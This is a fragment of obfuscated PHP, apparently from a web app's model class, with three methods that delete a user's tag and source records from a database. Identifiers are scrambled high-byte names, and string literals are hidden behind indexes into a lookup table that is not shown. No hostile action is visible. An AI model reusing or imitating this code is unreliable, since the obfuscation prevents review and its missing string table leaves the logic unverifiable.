removeFromTag($ÉÕ—øá, $¥¶ÀÒ¾¤) { $°šĞõŒ— =& $_SERVER[Õò”†—·]; if (!Model($°šĞõŒ—[2220])->listData($¥¶ÀÒ¾¤)) { return !1; } if (is_array($ÉÕ—øá)) { $ÉÕ—øá = array($°šĞõŒ—[17], $ÉÕ—øá); } $°â¼«§ = array($°šĞõŒ—[1746] => USER_ID, $°šĞõŒ—[542] => $¥¶ÀÒ¾¤, $°šĞõŒ—[479] => $ÉÕ—øá); return $this->where($°â¼«§)->delete(); } protected function removeByTag($›Şè—ı–) { $Ûè¤¼œô =& $_SERVER[Õò”†—·]; if (!$›Şè—ı–) { return !1; } $Ù–ø’ëå = array($Ûè¤¼œô[1746] => USER_ID, $Ûè¤¼œô[542] => $›Şè—ı–); return $this->where($Ù–ø’ëå)->delete(); } protected function removeBySource($ˆì¸è…Ğ) { $Õƒ”Öø• =& $_SERVER[Õò”†—·]; if (is_array($ˆì¸è…Ğ)) { $ˆì¸è…Ğ = array($Õƒ”Öø•[17], $ˆì¸è…Ğ); } $©èûğ = array($Õƒ”Öø•[1746] => USER_ID, $Õƒ”Öø•[542] => array($Õƒ”Öø•[1064], 0), $Õƒ”Öø•[479] => $ˆì¸è…Ğ); return $this->where($©èûğ)->delete(); } }